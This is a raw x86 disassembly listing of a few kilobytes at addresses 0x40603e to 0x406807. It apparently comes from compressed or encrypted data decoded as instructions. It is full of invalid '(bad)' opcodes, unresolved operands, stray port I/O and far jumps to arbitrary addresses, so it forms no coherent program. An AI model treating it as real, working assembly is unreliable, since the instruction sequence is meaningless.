  40603e:	repnz arpl WORD PTR ds:0x95cd9263,bx
  406045:	outs   dx,DWORD PTR ds:[esi]
  406046:	(bad)  
  406047:	xchg   ebx,eax
  406048:	popa   
  406049:	pop    esi
  40604a:	arpl   WORD PTR [esi],sp
  40604c:	mov    ch,0x82
  40604e:	add    BYTE PTR [eax-0x462daefc],bh
  406054:	cdq    
  406055:	push   cs
  406056:	shl    BYTE PTR ds:[eax],1
  406059:	mov    dl,0xc0
  40605b:	into   
  40605c:	adc    esi,DWORD PTR [edi]
  40605e:	lods   al,BYTE PTR ds:[esi]
  40605f:	sbb    eax,DWORD PTR [edx]
  406061:	mov    dh,BYTE PTR [ebp-0x1396bd74]
  406067:	jbe    0x406089
  406069:	adc    dl,BYTE PTR [ebx]
  40606b:	mov    cl,0x8b
  40606d:	inc    eax
  40606e:	pcmpgtd mm6,QWORD PTR [edi]
  406071:	jb     0x406013
  406073:	mov    BYTE PTR [eax],dh
  406075:	mov    ah,BYTE PTR [esi]
  406077:	mov    eax,0xf718459
  40607c:	sub    BYTE PTR [edi],ch
  40607e:	outs   dx,DWORD PTR ds:[esi]
  40607f:	mov    cl,0x89
  406081:	fild   DWORD PTR [ecx]
  406083:	and    DWORD PTR [ebx+0x57],0x63
  406087:	(bad)  
  406088:	out    dx,eax
  406089:	pop    ebp
  40608a:	jno    0x406103
  40608c:	pop    eax
  40608d:	out    dx,al
  40608e:	mov    bl,0x60
  406090:	add    ch,dh
  406092:	push   ds
  406093:	mov    ds:0x5a4fbd4e,al
  406098:	dec    edi
  406099:	mov    dh,0x31
  40609b:	inc    ecx
  40609c:	mov    WORD PTR [eax+0x21ebe5e7],ds
  4060a2:	jmp    0x40607e
  4060a4:	idiv   BYTE PTR [eax+edi*1+0xa]
  4060a8:	cmp    esi,DWORD PTR [eax]
  4060aa:	cli    
  4060ab:	xchg   ebp,eax
  4060ac:	pop    ds
  4060ad:	in     eax,0xaf
  4060af:	xor    DWORD PTR [edi+ecx*1-0x69011b39],ebx
  4060b6:	bound  edx,QWORD PTR [edi-0x35]
  4060b9:	lods   eax,DWORD PTR ds:[esi]
  4060ba:	repz out dx,al
  4060bc:	out    dx,eax
  4060bd:	sbb    al,0x2f
  4060bf:	jl     0x4060e0
  4060c1:	jns    0x4060ba
  4060c3:	mov    dl,0x26
  4060c5:	sahf   
  4060c6:	scas   al,BYTE PTR es:[edi]
  4060c7:	and    DWORD PTR ds:0xbe8dbfc3,esi
  4060cd:	inc    ebp
  4060ce:	shr    DWORD PTR [edx],1
  4060d0:	mov    eax,ds:0xe73e34b9
  4060d5:	mov    cs,WORD PTR [edx+0x2665715f]
  4060db:	lahf   
  4060dc:	enter  0x586c,0x6c
  4060e0:	ret    0x478e
  4060e3:	or     al,BYTE PTR [esi-0x29]
  4060e6:	mov    ecx,0x8c9b7c2a
  4060eb:	mov    edi,0x679fa838
  4060f0:	sub    al,0x47
  4060f2:	fs cs cld 
  4060f5:	xchg   ebx,ebp
  4060f7:	jae    0x406172
  4060f9:	mov    esp,0x69ba51e
  4060fe:	dec    edi
  4060ff:	aaa    
  406100:	xchg   edi,eax
  406101:	fisubr WORD PTR [ecx+0x44]
  406104:	mov    ebp,0x6ab0af05
  406109:	cmp    DWORD PTR [eax-0x12],edi
  40610c:	push   es
  40610d:	and    ecx,DWORD PTR [eax-0x2f]
  406110:	push   es
  406111:	pop    edx
  406112:	sbb    ecx,DWORD PTR [ecx+0x19]
  406115:	in     eax,dx
  406116:	jns    0x406135
  406118:	cld    
  406119:	aaa    
  40611a:	dec    ebx
  40611b:	fs xor al,0xa8
  40611e:	jae    0x4060b9
  406120:	mov    bl,0x52
  406122:	dec    edx
  406123:	mov    edx,0x9dfef1e4
  406128:	push   ss
  406129:	pushf  
  40612a:	xchg   esi,eax
  40612b:	push   esp
  40612c:	mov    al,ds:0x637e4160
  406131:	push   esp
  406132:	ja     0x4060df
  406134:	adc    esi,DWORD PTR [ebp+0x20]
  406137:	sub    DWORD PTR ds:0xdc0a22f4,edx
  40613d:	les    edi,FWORD PTR [ecx+0x781a72c1]
  406143:	pop    ecx
  406144:	jo     0x406100
  406146:	add    BYTE PTR [ecx],bh
  406148:	loop   0x406126
  40614a:	dec    eax
  40614b:	mov    WORD PTR [ecx],ds
  40614d:	int    0x1
  40614f:	fptan  
  406151:	dec    ecx
  406152:	fsubrp st(6),st
  406154:	js     0x40614d
  406156:	scas   al,BYTE PTR es:[edi]
  406157:	and    al,0x1a
  406159:	inc    edx
  40615a:	inc    edi
  40615b:	js     0x406129
  40615d:	mov    edi,0x74aa70d4
  406162:	ror    BYTE PTR [ebx],1
  406164:	gs push ax
  406167:	pushf  
  406168:	inc    eax
  406169:	add    ah,BYTE PTR [ebx]
  40616b:	jmp    0xe8c8:0x62455b9
  406172:	int3   
  406173:	push   eax
  406174:	repz mov dh,dh
  406177:	call   0x4d46:0x401e8a88
  40617e:	into   
  40617f:	dec    esi
  406180:	dec    esp
  406181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406182:	loope  0x4061ef
  406184:	mov    bl,0x44
  406186:	mov    ch,BYTE PTR [esp+edi*2]
  406189:	(bad)  
  40618a:	outs   dx,BYTE PTR ds:[esi]
  40618b:	jbe    0x406149
  40618d:	cmc    
  40618e:	inc    ebx
  40618f:	loopne 0x4061c7
  406191:	repnz mov ch,0xd6
  406194:	sub    ah,BYTE PTR [esi+0x15]
  406197:	adc    eax,0xcbd78d7e
  40619c:	and    eax,0xeb4b33bb
  4061a1:	cmp    DWORD PTR [edx],0xffffffb6
  4061a4:	scas   al,BYTE PTR es:[edi]
  4061a5:	aam    0x67
  4061a7:	outs   dx,DWORD PTR ds:[esi]
  4061a8:	xor    BYTE PTR gs:[esi+0x2b],al
  4061ac:	mov    esp,0xc8589cae
  4061b1:	inc    ebx
  4061b2:	icebp  
  4061b3:	bound  eax,QWORD PTR [eax+ebp*2]
  4061b6:	adc    eax,0x71ab6d41
  4061bb:	fdivr  st(6),st
  4061bd:	pushf  
  4061be:	sub    al,dh
  4061c0:	and    cl,cl
  4061c2:	jl     0x406229
  4061c4:	or     al,0x63
  4061c6:	lahf   
  4061c7:	jo     0x406193
  4061c9:	dec    esp
  4061ca:	pop    esi
  4061cb:	push   esp
  4061cc:	shr    cl,0x4c
  4061cf:	mov    BYTE PTR [edx+0x53395e97],ch
  4061d5:	mov    ebx,es
  4061d7:	or     ah,ch
  4061d9:	xor    DWORD PTR [esp+ecx*1-0x31f9c455],ebp
  4061e0:	mov    gs,ebx
  4061e2:	adc    eax,0x8c16f2a4
  4061e7:	ret    
  4061e8:	scas   eax,DWORD PTR es:[edi]
  4061e9:	add    DWORD PTR [esi],edi
  4061eb:	es pop edx
  4061ed:	jle    0x406197
  4061ef:	mov    edx,0xc6baf8d3
  4061f4:	hlt    
  4061f5:	cwde   
  4061f6:	es gs pop ebx
  4061f9:	or     DWORD PTR [ecx+0x48],edi
  4061fc:	adc    DWORD PTR ds:0xfb14424f,edi
  406202:	hlt    
  406203:	and    al,0xaf
  406205:	(bad)  
  406206:	or     BYTE PTR [eax],cl
  406208:	dec    ebx
  406209:	dec    ecx
  40620a:	or     dl,BYTE PTR [edi-0x2811048e]
  406210:	(bad)  
  406211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406212:	sub    BYTE PTR [edx],dl
  406214:	sti    
  406215:	out    dx,al
  406216:	or     al,0xcf
  406218:	cmp    BYTE PTR [edx],bl
  40621a:	ds int3 
  40621c:	mov    ebp,0xea753412
  406221:	dec    edx
  406222:	cmc    
  406223:	push   edi
  406224:	xchg   edx,eax
  406225:	or     DWORD PTR [ebx],0x6f
  406228:	daa    
  406229:	xchg   ebp,eax
  40622a:	lahf   
  40622b:	jle    0x40628c
  40622d:	call   0x873f32da
  406232:	call   0x83ebd669
  406237:	popa   
  406238:	xchg   esp,eax
  406239:	es pop es
  40623b:	sub    eax,0xd206b6b
  406240:	ds or  al,0xe9
  406243:	retf   
  406244:	dec    bl
  406246:	retf   0xe964
  406249:	icebp  
  40624a:	(bad)  [eax-0x1b]
  40624d:	int    0xde
  40624f:	or     al,BYTE PTR [eax+0x23eb2226]
  406255:	fwait
  406256:	out    0xb9,al
  406258:	dec    edi
  406259:	jmp    0x10425dc4
  40625e:	add    bl,BYTE PTR [ecx+0x5558c167]
  406264:	sub    ebx,DWORD PTR [edx+esi*4+0x63b99936]
  40626b:	dec    esi
  40626c:	ins    DWORD PTR es:[edi],dx
  40626d:	push   0x7c
  40626f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406270:	pop    ecx
  406271:	in     eax,dx
  406272:	and    BYTE PTR [edx+0x26],dl
  406275:	sti    
  406276:	es cwde 
  406278:	daa    
  406279:	ins    DWORD PTR es:[edi],dx
  40627a:	das    
  40627b:	fucom  st(0)
  40627d:	mov    bh,0x2a
  40627f:	jae    0x4062c8
  406281:	and    eax,0x1a5379dc
  406286:	shr    DWORD PTR [edx+0x63],cl
  406289:	into   
  40628a:	jae    0x406268
  40628c:	ja     0x4062ee
  40628e:	push   ds
  40628f:	or     DWORD PTR [edi+eax*4+0x6d],esp
  406293:	fisubr WORD PTR [ebx]
  406295:	jb     0x406239
  406297:	nop
  406298:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406299:	lahf   
  40629a:	clc    
  40629b:	(bad)  [edi+ecx*1-0x5f]
  40629f:	je     0x4062d4
  4062a1:	mov    ebx,0x13c491e5
  4062a6:	cmp    ah,ah
  4062a8:	lods   al,BYTE PTR ds:[esi]
  4062a9:	je     0x40625d
  4062ab:	icebp  
  4062ac:	xor    DWORD PTR [edi+0x6f7756fe],esi
  4062b2:	aaa    
  4062b3:	hlt    
  4062b4:	cmova  edi,DWORD PTR [ebx+0xe]
  4062b8:	dec    esi
  4062b9:	mov    bh,0xa
  4062bb:	lahf   
  4062bc:	(bad)  
  4062bd:	out    0x7f,al
  4062bf:	out    dx,eax
  4062c0:	popa   
  4062c1:	push   edx
  4062c2:	cwde   
  4062c3:	jmp    0x4062b9
  4062c5:	lods   al,BYTE PTR ds:[esi]
  4062c6:	mov    ecx,0x36fcc497
  4062cb:	or     eax,0x43228a4
  4062d0:	loopne 0x40628b
  4062d2:	pop    ecx
  4062d3:	fidivr WORD PTR [ebx]
  4062d5:	pop    ebp
  4062d6:	xchg   esi,eax
  4062d7:	aaa    
  4062d8:	xchg   esi,eax
  4062d9:	adc    esi,eax
  4062db:	icebp  
  4062dc:	bound  ebx,QWORD PTR [ebp+0xa5c4643]
  4062e2:	or     ecx,DWORD PTR [edx+0x7e0893b4]
  4062e8:	les    edi,FWORD PTR cs:[edx+0x26]
  4062ec:	bound  ebp,QWORD PTR [ebx+0x75510001]
  4062f2:	push   eax
  4062f3:	lods   eax,DWORD PTR ds:[esi]
  4062f4:	retf   0xd2f6
  4062f7:	rol    DWORD PTR [ecx+eiz*8-0x724cd29],0xa2
  4062ff:	mov    ah,al
  406301:	enter  0xee1,0x42
  406305:	fwait
  406306:	mov    DWORD PTR [ebx],edi
  406308:	cld    
  406309:	(bad)  
  40630a:	jbe    0x4062de
  40630c:	int    0x15
  40630e:	cmp    eax,0x3e8185c8
  406313:	scas   al,BYTE PTR es:[edi]
  406314:	cmp    DWORD PTR [edi+0x10fa459d],esi
  40631a:	inc    eax
  40631b:	add    eax,0xe973cef8
  406320:	(bad)  
  406321:	mov    edi,0x83bf9e24
  406326:	push   ecx
  406327:	xor    al,0xaa
  406329:	sub    DWORD PTR [esi+0x58],ebx
  40632c:	out    0x31,eax
  40632e:	inc    edx
  40632f:	cmp    esp,ebp
  406331:	scas   al,BYTE PTR es:[edi]
  406332:	daa    
  406333:	sbb    esi,edi
  406335:	mov    ebx,0x42de2e46
  40633a:	mov    bl,0x63
  40633c:	dec    edx
  40633d:	jns    0x406382
  40633f:	repnz bound esi,QWORD PTR [eax]
  406342:	mov    dh,0xb9
  406344:	lods   eax,DWORD PTR ds:[esi]
  406345:	into   
  406346:	mul    DWORD PTR [ecx-0x7bdacd28]
  40634c:	or     ecx,esi
  40634e:	icebp  
  40634f:	out    0xa8,al
  406351:	mov    edx,0x2077309
  406356:	jbe    0x406365
  406358:	in     eax,0xa9
  40635a:	fcom   DWORD PTR [ebx+0x1c32897e]
  406360:	jle    0x4062fe
  406362:	mov    dl,0x92
  406364:	mov    esp,0x7485db7b
  406369:	and    eax,0x20d5348
  40636e:	or     eax,0xa89f9bbe
  406373:	shr    ah,0x1e
  406376:	push   0x4b
  406378:	cmp    DWORD PTR [esi+0x67],0xc0909da
  40637f:	push   edi
  406380:	pop    ecx
  406381:	rcl    BYTE PTR [ecx],1
  406383:	scas   al,BYTE PTR es:[edi]
  406384:	mov    ecx,?
  406386:	cmp    DWORD PTR [edx-0x793cc5c8],ecx
  40638c:	aaa    
  40638d:	jnp    0x406391
  40638f:	cmp    al,0x71
  406391:	jnp    0x40640b
  406393:	imul   ebx,ebx,0x7c29378a
  406399:	mov    cl,0xb6
  40639b:	(bad)  
  40639c:	loope  0x4063a2
  40639e:	scas   eax,DWORD PTR es:[edi]
  40639f:	jae    0x406366
  4063a1:	repz mov ?,WORD PTR [esi-0x51d5d237]
  4063a8:	or     dl,BYTE PTR [edx+0x6f814097]
  4063ae:	jmp    0x6a1c:0xaf872508
  4063b5:	lods   al,BYTE PTR ds:[esi]
  4063b6:	repnz add bl,BYTE PTR [ecx+0x5d]
  4063ba:	xor    eax,0x652566f8
  4063bf:	dec    ecx
  4063c0:	arpl   WORD PTR cs:[edi-0x43],dx
  4063c4:	ins    DWORD PTR es:[edi],dx
  4063c5:	scas   eax,DWORD PTR es:[edi]
  4063c6:	(bad)  
  4063c7:	stos   DWORD PTR es:[edi],eax
  4063c8:	fidivr WORD PTR [ecx-0x6b79674f]
  4063ce:	mov    bl,0x2d
  4063d0:	sbb    esi,DWORD PTR [ebx-0x4f]
  4063d3:	or     ebp,DWORD PTR [edi-0x23]
  4063d6:	cmp    edi,DWORD PTR [edx+0x1330cda3]
  4063dc:	and    esp,ebp
  4063de:	lods   al,BYTE PTR ds:[esi]
  4063df:	out    dx,eax
  4063e0:	popa   
  4063e1:	push   cs
  4063e2:	fs push edx
  4063e4:	push   ebx
  4063e5:	(bad)  
  4063e6:	leave  
  4063e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063e8:	in     al,0x63
  4063ea:	in     al,dx
  4063eb:	add    DWORD PTR [bp+di+0x3c92],esp
  4063f0:	inc    edx
  4063f1:	xchg   dl,al
  4063f3:	dec    eax
  4063f4:	mov    edi,0x3a2e441d
  4063f9:	sub    edx,DWORD PTR [esi]
  4063fb:	pop    ebp
  4063fc:	into   
  4063fd:	lea    eax,[edi+0x289aba51]
  406403:	mov    ecx,0x25b36952
  406408:	imul   eax,DWORD PTR [eax-0x73],0xe6ca43d2
  40640f:	data16 out dx,al
  406411:	cmp    dh,BYTE PTR [eax]
  406413:	ret    
  406414:	adc    al,0xc3
  406416:	adc    dl,BYTE PTR [edi-0x7e]
  406419:	and    dl,BYTE PTR [esi]
  40641b:	fld    QWORD PTR [edi]
  40641d:	mov    eax,0x657814db
  406422:	dec    ebp
  406423:	and    BYTE PTR [eax-0x57],bl
  406426:	or     al,0x46
  406428:	(bad)  
  406429:	pushf  
  40642a:	enter  0x550e,0x70
  40642e:	pop    ebp
  40642f:	fistp  WORD PTR [esi]
  406431:	add    cl,al
  406433:	xor    BYTE PTR [esi-0x60],0x33
  406437:	outs   dx,DWORD PTR ds:[esi]
  406438:	rcr    bh,1
  40643a:	dec    DWORD PTR [ebx+0xa]
  40643d:	dec    esi
  40643e:	sbb    al,0xd8
  406440:	popa   
  406441:	mov    ds:0x91b09e8d,eax
  406446:	jp     0x406423
  406448:	cld    
  406449:	dec    ecx
  40644a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40644b:	pop    es
  40644c:	add    edx,ecx
  40644e:	sub    ebp,esi
  406450:	push   es
  406451:	lock add ch,ah
  406454:	xor    dh,BYTE PTR ds:0xcf449f2f
  40645a:	cmp    DWORD PTR [esi-0x4d3b1a1e],esp
  406460:	sub    edx,DWORD PTR [edx-0x382cddce]
  406466:	int3   
  406467:	fwait
  406468:	mov    al,ds:0x20a87428
  40646d:	mov    ebx,0x88fb8b34
  406472:	fld    QWORD PTR [esi]
  406474:	jg     0x4064e5
  406476:	push   ebx
  406477:	push   DWORD PTR [eax+ebx*8+0x5a]
  40647b:	data16 cmp BYTE PTR cs:[ecx+0x6acdc9fb],0xa9
  406484:	inc    ebp
  406486:	in     al,dx
  406487:	jmp    0x6d26:0x9cb6dc7b
  40648e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40648f:	shl    DWORD PTR [edi-0x5663aebf],0x40
  406496:	cld    
  406497:	cmp    al,BYTE PTR [eax]
  406499:	xor    dl,BYTE PTR [edi]
  40649b:	add    eax,0x115ad1af
  4064a0:	xchg   ebp,eax
  4064a1:	mov    eax,0xca7be247
  4064a6:	or     eax,0x93f5ac30
  4064ab:	inc    edi
  4064ac:	(bad)  
  4064ad:	bound  ebx,QWORD PTR [ebx-0x3e]
  4064b0:	push   0x8f11fbe2
  4064b5:	jg     0x4064fa
  4064b7:	add    al,0x2f
  4064b9:	std    
  4064ba:	pop    eax
  4064bb:	js     0x406508
  4064bd:	ficom  DWORD PTR [ecx+edi*2+0x6e1d690e]
  4064c4:	addr16 jp 0x406477
  4064c7:	mov    ds:0xbed88a46,al
  4064cc:	not    DWORD PTR [ecx+0x69]
  4064cf:	inc    esp
  4064d0:	ja     0x40648c
  4064d2:	lods   eax,DWORD PTR ds:[esi]
  4064d3:	rcr    BYTE PTR [edx+0x59e7aa4c],cl
  4064d9:	xor    al,0x8b
  4064db:	inc    eax
  4064dc:	xor    BYTE PTR [edx+0x77],ch
  4064df:	out    dx,al
  4064e0:	js     0x406498
  4064e2:	mov    bh,0xed
  4064e4:	jl     0x40648b
  4064e6:	aad    0x1a
  4064e8:	cld    
  4064e9:	int    0x71
  4064eb:	inc    edi
  4064ec:	and    DWORD PTR [edx-0x5fe735e],edi
  4064f2:	lock push ss
  4064f4:	jae    0x406504
  4064f6:	outs   dx,DWORD PTR ds:[esi]
  4064f7:	dec    ebx
  4064f8:	fild   QWORD PTR [edi]
  4064fa:	aas    
  4064fb:	mov    cl,BYTE PTR [edx+ebp*8]
  4064fe:	sahf   
  4064ff:	or     BYTE PTR ds:0xc86e7f96,dl
  406505:	mov    ?,esp
  406507:	inc    edi
  406508:	inc    edx
  406509:	imul   ebp,DWORD PTR [ecx-0x59],0x377bfef
  406510:	jmp    0x406512
  406512:	mov    DWORD PTR [ebp+0x4992d1ff],esp
  406518:	mov    cl,BYTE PTR [eax-0x884bb68]
  40651e:	add    ah,al
  406520:	les    ebp,FWORD PTR [ebp-0x27c74a9a]
  406526:	sub    eax,0xb1d1174c
  40652b:	push   ss
  40652c:	push   ss
  40652d:	lock push esp
  40652f:	hlt    
  406530:	in     al,0x5b
  406532:	inc    edx
  406533:	repz mov esp,0x5ba030bb
  406539:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40653a:	xor    al,0xd9
  40653c:	fnstsw WORD PTR [ecx]
  40653e:	or     DWORD PTR [eax+0x83ea9df],edi
  406544:	dec    edx
  406545:	dec    eax
  406546:	stos   DWORD PTR es:[edi],eax
  406547:	ss sbb eax,esp
  40654a:	push   ebp
  40654b:	sar    ebx,0xbe
  40654e:	cmc    
  40654f:	cmp    DWORD PTR [edx+ebx*1],esp
  406552:	ja     0x4064e2
  406554:	pushf  
  406555:	ins    DWORD PTR es:[edi],dx
  406556:	ins    BYTE PTR es:[edi],dx
  406557:	iret   
  406558:	scas   eax,DWORD PTR es:[edi]
  406559:	mov    ?,WORD PTR [ebp-0x2c6def92]
  40655f:	mov    esi,0xdd451c07
  406564:	(bad)  
  406565:	mov    dh,0x62
  406567:	popa   
  406568:	sahf   
  406569:	xchg   esp,eax
  40656a:	arpl   WORD PTR [edx],bx
  40656c:	dec    ebx
  40656d:	push   edi
  40656e:	test   eax,0x130061d2
  406573:	add    al,0x32
  406575:	out    dx,al
  406576:	popa   
  406577:	mov    ch,0x95
  406579:	cdq    
  40657a:	cmp    eax,0x3e3968a8
  40657f:	sbb    eax,0x4f0a6038
  406584:	jge    0x4065fc
  406586:	inc    edi
  406587:	jecxz  0x4065c1
  406589:	sub    ebp,ebx
  40658b:	sub    al,0x3
  40658d:	dec    esi
  40658e:	sub    eax,0x8720e7e4
  406593:	lods   eax,DWORD PTR ds:[esi]
  406594:	mov    eax,0x938cb77f
  406599:	fist   DWORD PTR [ebx]
  40659b:	inc    edx
  40659c:	dec    ebp
  40659d:	jg     0x406588
  40659f:	sub    DWORD PTR [edi],esi
  4065a1:	jnp    0x4065aa
  4065a3:	jae    0x406539
  4065a5:	push   ds
  4065a6:	sar    DWORD PTR [esp+edi*4],0x50
  4065aa:	xor    dh,al
  4065ac:	dec    esi
  4065ad:	lea    esp,[esi-0x666ca3c6]
  4065b3:	jl     0x40657f
  4065b5:	cwde   
  4065b6:	add    DWORD PTR [ebp-0x4ec626f4],ebp
  4065bc:	bound  edi,QWORD PTR [ebp+edx*2-0x455686c4]
  4065c3:	call   0xff741ac8
  4065c8:	popa   
  4065c9:	push   ebx
  4065ca:	call   0x2e38:0xea7b52d2
  4065d1:	in     eax,dx
  4065d2:	mov    DWORD PTR [eax*8-0x5ad15564],edi
  4065d9:	cmp    BYTE PTR [esi+0x7a],dh
  4065dc:	ins    BYTE PTR es:[edi],dx
  4065dd:	cmp    BYTE PTR [esi-0x5a],dh
  4065e0:	call   0x7dd:0x32d935f6
  4065e7:	adc    edi,DWORD PTR [esi+0x10]
  4065ea:	neg    BYTE PTR [edx]
  4065ec:	fistp  WORD PTR [ecx-0xc]
  4065ef:	test   al,bh
  4065f1:	mov    bh,0x61
  4065f3:	mov    al,ds:0xa8a48fcd
  4065f8:	sub    eax,0x3aa181c7
  4065fd:	adc    eax,0xbc307082
  406602:	imul   ebx,DWORD PTR [ebx-0x3a],0x4
  406606:	fcom   DWORD PTR [edi-0x43]
  406609:	jmp    0xbadd:0x2746e978
  406610:	mul    DWORD PTR [eax+edx*8]
  406613:	pop    esi
  406614:	jnp    0x40663f
  406616:	lock lds eax,FWORD PTR [edx+0x2ca19f23]
  40661d:	cmp    DWORD PTR [esp+ecx*1-0xa],ebp
  406621:	sbb    BYTE PTR [eax],dl
  406623:	stos   BYTE PTR es:[edi],al
  406624:	sub    DWORD PTR ss:[esi],edi
  406627:	jne    0x4065c9
  406629:	loope  0x40669a
  40662b:	mov    gs,eax
  40662d:	sub    ecx,esi
  40662f:	xchg   ebx,eax
  406630:	mov    esi,DWORD PTR [ecx]
  406632:	adc    eax,0x9346de61
  406637:	dec    eax
  406638:	sub    ch,dh
  40663a:	jle    0x406601
  40663c:	(bad)  
  40663d:	push   esi
  40663e:	jae    0x406618
  406640:	mov    dl,0xd7
  406642:	mov    ds:0xfd83ce9c,al
  406647:	cmp    ebp,eax
  406649:	mov    dh,0x8b
  40664b:	mov    bh,BYTE PTR [ecx-0x61]
  40664e:	mov    cl,0x8c
  406650:	cmp    DWORD PTR [ebx-0x2ef6c7be],ebp
  406656:	mov    esi,0xdaf67279
  40665b:	xor    BYTE PTR [ebx+0x39],dh
  40665e:	cmp    eax,esi
  406660:	cli    
  406661:	in     al,0x75
  406663:	mov    esp,0x9bc2e123
  406668:	enter  0xc1b3,0x69
  40666c:	shl    al,1
  40666e:	mov    gs,WORD PTR [eax+eiz*8-0x407c5a81]
  406675:	mov    esp,0x8353ef53
  40667a:	addr16 in eax,dx
  40667c:	iret   
  40667d:	popf   
  40667e:	mov    eax,0x7618c342
  406683:	add    BYTE PTR [esp+ecx*1-0x1f327c66],bl
  40668a:	mov    al,0x51
  40668c:	or     al,0x42
  40668e:	lods   al,BYTE PTR ds:[esi]
  40668f:	sub    edi,DWORD PTR [ebp-0x30]
  406692:	xchg   ch,bh
  406694:	mov    eax,0xc93894c7
  406699:	and    DWORD PTR [edi],ebx
  40669b:	mov    ds:0x42f92157,al
  4066a0:	sub    al,BYTE PTR [edi+edx*1]
  4066a3:	jae    0x40666b
  4066a5:	outs   dx,BYTE PTR ds:[esi]
  4066a6:	add    dl,BYTE PTR [edi-0x45]
  4066a9:	js     0x40669c
  4066ab:	and    cl,dl
  4066ad:	mov    al,0x7d
  4066af:	je     0x4066c0
  4066b1:	sub    al,0x24
  4066b3:	jb     0x406693
  4066b5:	jbe    0x406683
  4066b7:	dec    ebp
  4066b8:	mov    cl,0xc0
  4066ba:	pop    es
  4066bb:	ins    DWORD PTR es:[edi],dx
  4066bc:	or     edi,esi
  4066be:	dec    esi
  4066bf:	retf   0xf41f
  4066c2:	nop
  4066c3:	ja     0x40667b
  4066c5:	imul   esi,esp,0xffffff9e
  4066c8:	das    
  4066c9:	push   ss
  4066ca:	mov    al,0x55
  4066cc:	dec    ebx
  4066cd:	fnsave [ecx]
  4066cf:	pop    ebx
  4066d0:	jecxz  0x40670c
  4066d2:	and    ebp,DWORD PTR [edx+0x7b1793e5]
  4066d8:	jnp    0x406742
  4066da:	push   esp
  4066db:	inc    BYTE PTR [ebx+0x19]
  4066de:	pop    edi
  4066df:	into   
  4066e0:	pop    ebx
  4066e1:	jmp    0x7fe128f3
  4066e6:	mov    bh,0x28
  4066e8:	and    BYTE PTR ds:0x3dd3ebde,0x32
  4066ef:	neg    BYTE PTR fs:[bx+di-0x6b4e]
  4066f5:	cmp    DWORD PTR [ecx-0x5d77c768],ebp
  4066fb:	jno    0x40672d
  4066fd:	sbb    DWORD PTR [esi+0x2d],edx
  406700:	xor    BYTE PTR [edx],bh
  406702:	inc    esi
  406703:	aas    
  406704:	xchg   esp,eax
  406705:	sar    BYTE PTR [eax+eiz*2-0x78e1c23e],cl
  40670c:	xchg   edi,eax
  40670d:	ins    DWORD PTR es:[edi],dx
  40670e:	lds    edx,FWORD PTR [ebp-0x58]
  406711:	add    bl,BYTE PTR [ebp-0x5a13b732]
  406717:	sbb    al,0xdf
  406719:	mov    es,WORD PTR [ecx]
  40671b:	std    
  40671c:	call   0x4341:0xa7f249af
  406723:	popf   
  406724:	cmp    eax,0x71b0c2bf
  406729:	mov    al,0x9c
  40672b:	cld    
  40672c:	xor    al,0x90
  40672e:	jb     0x406755
  406730:	outs   dx,BYTE PTR ds:[esi]
  406731:	clc    
  406732:	js     0x40670a
  406734:	(bad)  
  406735:	lods   al,BYTE PTR ds:[esi]
  406736:	xor    DWORD PTR [ebx+0x121c4b87],ebp
  40673c:	ins    BYTE PTR es:[edi],dx
  40673d:	data16 out 0xc0,al
  406740:	cs gs ja 0x4067bf
  406744:	and    esp,DWORD PTR [edi-0x6]
  406747:	push   es
  406748:	retf   
  406749:	mov    dl,0x4c
  40674b:	in     eax,dx
  40674c:	push   ebp
  40674d:	into   
  40674e:	cmp    ah,BYTE PTR [edi+0x73e338ff]
  406754:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406755:	test   eax,0xb38cf3a8
  40675a:	jge    0x406733
  40675c:	std    
  40675d:	xor    al,BYTE PTR [eax]
  40675f:	addr16 (bad) 
  406761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406762:	(bad)  
  406764:	mov    ch,0xb
  406766:	push   cs
  406767:	popa   
  406768:	imul   esp,DWORD PTR [ebx],0x4a37586a
  40676e:	jle    0x406755
  406770:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406771:	sub    DWORD PTR [esi-0x2f770016],0xd601ad
  40677b:	mov    esi,0x5994a1e9
  406780:	cs loop 0x406737
  406783:	adc    eax,0x160b1f22
  406788:	js     0x406764
  40678a:	jecxz  0x4067d7
  40678c:	data16 lods al,BYTE PTR ds:[esi]
  40678e:	sbb    eax,0x59126056
  406793:	and    al,0x3b
  406795:	hlt    
  406796:	cmp    DWORD PTR [edx-0x2ecb41cd],edi
  40679c:	cmc    
  40679d:	bound  ebp,QWORD PTR [ebx+0x3a]
  4067a0:	fimul  WORD PTR [ecx+0x7c]
  4067a3:	lods   eax,DWORD PTR ds:[esi]
  4067a4:	mov    eax,0xd6aae08d
  4067a9:	iret   
  4067aa:	cld    
  4067ab:	add    eax,0x95f56b89
  4067b0:	sbb    al,BYTE PTR [ebx+0x415d0d17]
  4067b6:	mov    ah,0x7b
  4067b8:	scas   al,BYTE PTR es:[edi]
  4067b9:	inc    eax
  4067ba:	or     edi,ebp
  4067bc:	idiv   BYTE PTR [eax]
  4067be:	lea    edi,[ebx]
  4067c0:	sbb    BYTE PTR [eax+0x40],bh
  4067c3:	fsub   QWORD PTR [eax]
  4067c5:	loope  0x40679d
  4067c7:	inc    ebx
  4067c8:	call   0xc989:0x9a5aebef
  4067cf:	lea    ecx,[edi-0x7de76158]
  4067d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067d6:	sub    eax,0x523757b8
  4067db:	jo     0x406808
  4067dd:	mov    edx,0x9308f238
  4067e2:	jle    0x406764
  4067e4:	push   es
  4067e5:	ins    BYTE PTR es:[edi],dx
  4067e6:	cmp    al,BYTE PTR [esi+0xc]
  4067e9:	mov    al,0xe5
  4067ec:	jl     0x4067bc
  4067ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4067ef:	pop    esp
  4067f0:	or     al,0x8f
  4067f2:	out    dx,al
  4067f3:	arpl   WORD PTR [ebx+edi*4+0x6e],cx
  4067f7:	(bad)
  4067fa:	mov    ah,0x59
  4067fc:	mov    al,ds:0x9b8277ab
  406801:	dec    ecx
  406802:	dec    edi
  406803:	ret    0xa31d
  406806:	pop    ebx
  406807:	clc    
